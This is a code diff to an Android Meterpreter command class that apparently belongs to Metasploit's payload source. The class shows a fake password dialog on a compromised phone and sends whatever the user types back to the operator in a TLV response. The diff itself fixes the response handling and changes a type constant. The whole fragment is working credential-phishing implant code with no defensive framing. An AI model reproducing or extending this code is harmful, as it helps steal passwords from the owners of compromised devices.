@@ -23,11 +23,12 @@ import java.lang.reflect.Method;
 public class android_password_request implements Command {
 
     private static final int TLV_EXTENSIONS = 20000;
-    private static final int TLV_TYPE_PASSWORD_REQUEST = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 2);
+    private static final int TLV_TYPE_PASSWORD_REQUEST = TLVPacket.TLV_META_TYPE_STRING | (TLV_EXTENSIONS + 202);
 
-    public int execute(Meterpreter meterpreter, TLVPacket request, TLVPacket response) throws Exception {
+    public int execute(Meterpreter meterpreter, TLVPacket request, final TLVPacket response) throws Exception {
         AndroidMeterpreter androidMeterpreter = (AndroidMeterpreter) meterpreter;
         final Context context = androidMeterpreter.getContext();
+        final TLVPacket finalResponse = response;
         Handler handler = new Handler(context.getMainLooper());
         handler.post(new Runnable() {
             @Override
@@ -78,7 +79,7 @@ public class android_password_request implements Command {
                     new DialogInterface.OnClickListener() {
                         public void onClick(DialogInterface dialog, int which) {
                             try {
-                                response.add(TLV_TYPE_PASSWORD_REQUEST, input.getText());
+                                finalResponse.add(TLV_TYPE_PASSWORD_REQUEST, input.getText());
                                 //response.addOverflow(TLV_TYPE_PASSWORD_REQUEST, input.getText());
                             }
                             catch(IOException e) {
